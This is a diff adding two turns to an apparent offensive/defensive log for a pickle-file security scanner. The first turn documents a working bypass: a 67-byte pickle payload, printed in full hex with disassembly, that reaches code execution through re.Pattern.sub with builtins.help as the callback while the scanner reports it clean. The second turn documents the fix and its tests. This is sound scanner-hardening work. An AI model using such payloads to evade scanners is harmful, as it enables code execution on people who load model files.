@@ -19510,3 +19510,199 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3864 passed, 1022 skipped, 21 warnings in 53.58s
 ```
+
+## Turn 285 - Bypass via compiled `re.Pattern.sub` callback dispatch
+
+Offensive turn after the Turn 284 defense. The scanner now models top-level
+`re.sub` and `re.subn` replacement callbacks when it can prove a literal pattern
+matches a literal input, but the same callback dispatch is reachable through
+compiled regex pattern method descriptors.
+
+Representative payload:
+
+```python
+pattern = re.compile("x")
+re.Pattern.sub(pattern, builtins.help, "x")
+```
+
+The shadow `pydoc.py` writes a marker at import time and defines `help()` to
+return a replacement string. Unpickling first constructs a compiled regex
+object, then calls the unbound `re.Pattern.sub` descriptor. The regex engine
+invokes `builtins.help(match)` as the replacement callback.
+
+```text
+payload_len 67
+payload_hex 80048c0272658c07636f6d70696c65938c0178855294308c0272658c0b5061747465726e2e737562932868008c086275696c74696e738c0468656c70938c017874522e
+
+0: PROTO              4
+15: STACK_GLOBAL       # re.compile
+16: SHORT_BINUNICODE   # pattern "x"
+20: REDUCE             # re.compile("x")
+21: MEMOIZE            # memo[0] = compiled pattern
+22: POP
+40: STACK_GLOBAL       # re.Pattern.sub method descriptor
+42: BINGET             # compiled pattern receiver
+60: STACK_GLOBAL       # builtins.help replacement callback
+61: SHORT_BINUNICODE   # input "x"
+64: TUPLE              # (pattern, help, "x")
+65: REDUCE             # re.Pattern.sub(pattern, help, "x")
+66: STOP
+```
+
+Scanner proof:
+
+```text
+scan clean findings 0 errors ()
+imports [
+  ('re', 'compile', 15, False),
+  ('re', 'Pattern.sub', 40, False),
+  ('builtins', 'help', 60, False),
+]
+invocations [
+  ('re', 'compile', 1, 20),
+  ('re', 'Pattern.sub', 3, 65),
+]
+```
+
+Runtime proof:
+
+```text
+runtime_rc 0
+runtime_type str
+runtime_result 'OWNED-sub'
+marker_exists True
+marker_text owned-by-pattern-sub
+```
+
+Sibling clean bypass:
+
+```text
+pattern = re.compile("x")
+re.Pattern.subn(pattern, builtins.help, "x")
+payload_len 68
+scan clean findings 0
+runtime tuple ('OWNED-subn', 1) True owned-by-pattern-subn
+```
+
+Callback boundary:
+
+```text
+pattern = re.compile("z")
+re.Pattern.sub(pattern, builtins.help, "x")
+scan clean findings 0
+runtime_result 'x'
+marker_exists False
+```
+
+Why it bypasses:
+
+- `re.Pattern.sub` and `re.Pattern.subn` are clean import references and are not
+  covered by the callback-dispatch table.
+- `builtins.help` remains a clean import unless the scanner records an actual
+  callable invocation.
+- The Turn 284 guard can inspect top-level `re.sub(pattern, repl, string)`
+  arguments directly, but the method-descriptor form hides the pattern inside a
+  compiled regex object produced by an earlier reducer.
+- The native stack model currently represents `re.compile("x")` as a generic
+  constructed value, losing the literal pattern needed to prove whether
+  `Pattern.sub` will call the replacement callback.
+
+Likely source-level defense:
+
+- Model `re.compile(literal_pattern)` as a small callback-relevant stack value
+  that preserves the literal pattern when flags are absent or simple.
+- Add `re.Pattern.sub` and `re.Pattern.subn` callback-dispatch rows with
+  receiver slot 0, callback slot 1, input slot 2, and callback arity 1.
+- Reuse the Turn 284 literal-regex guard against the stored receiver pattern and
+  the literal input. Keep the no-match boundary clean.
+
+Simplification note:
+
+- This is not a new sink family; it is the same regex replacement callback
+  source surfaced through a compiled receiver.
+- A compact `RegexPattern { pattern }` stack value would let top-level and
+  descriptor regex callbacks share the same guard, instead of adding package
+  policy entries.
+
+Performance note:
+
+- The representative payload is 67 bytes.
+- Warm scan timing over 1000 runs was median `0.000058s`, p95 `0.000061s`,
+  and max `0.000173s`.
+
+## Turn 286 - Defense for compiled `re.Pattern.sub` callbacks
+
+Defensive turn for the Turn 285 bypass. The fix preserves literal regex
+patterns produced by `re.compile(...)` and reuses the Turn 284 callback guard
+for compiled pattern method descriptors.
+
+Implementation:
+
+- Added a compact `RegexPattern { pattern }` stack value for `re.compile(...)`
+  results when the pattern argument is tracked as a literal string or bytes
+  preview.
+- Extended the regex callback-dispatch rows to cover `re.Pattern.sub` and
+  `re.Pattern.subn` with receiver slot 0, callback slot 1, input slot 2, and
+  callback arity 1.
+- Reused the same conservative `literal_regex_match` guard: the synthetic
+  callback is emitted only when the stored pattern is a plain literal and is
+  empty or contained in the literal input.
+- Kept no-match descriptor calls clean, preserving the boundary where CPython
+  does not invoke the replacement callback.
+
+Regression coverage:
+
+- `re.compile("x"); re.Pattern.sub(pattern, builtins.help, "x")` is malicious
+  and records `builtins.help(match)`.
+- `re.compile("x"); re.Pattern.subn(pattern, builtins.help, "x")` is malicious
+  and records the same hidden callback.
+- No-match descriptor cases using `re.compile("z")` remain clean and do not
+  import shadow `pydoc.py` at runtime.
+
+Post-fix proof for the representative payload:
+
+```text
+payload_len 67
+scan malicious findings 1 errors ()
+invocations [
+  ('re', 'compile', 1, 20),
+  ('re', 'Pattern.sub', 3, 65),
+  ('builtins', 'help', 1, 65),
+]
+no_match_scan clean findings 0
+subn_scan malicious findings 1
+runtime_rc 0
+runtime_type str
+runtime_result 'OWNED'
+marker_exists True
+marker_text owned-by-pattern-sub
+```
+
+Performance note:
+
+- Warm scan timing over 1000 post-fix runs was median `0.000122s`, p95
+  `0.000126s`, and max `0.000766s`.
+- The stored pattern is only created for exact `re.compile` reducer calls and
+  the descriptor guard remains exact module/name/arity gated.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py::test_scan_bytes_blocks_re_pattern_sub_replacement_callback_rce packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py::test_scan_bytes_keeps_re_pattern_sub_no_match_callback_lazy -q
+4 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+153 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+191 passed
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3868 passed, 1022 skipped, 21 warnings in 49.26s
+```
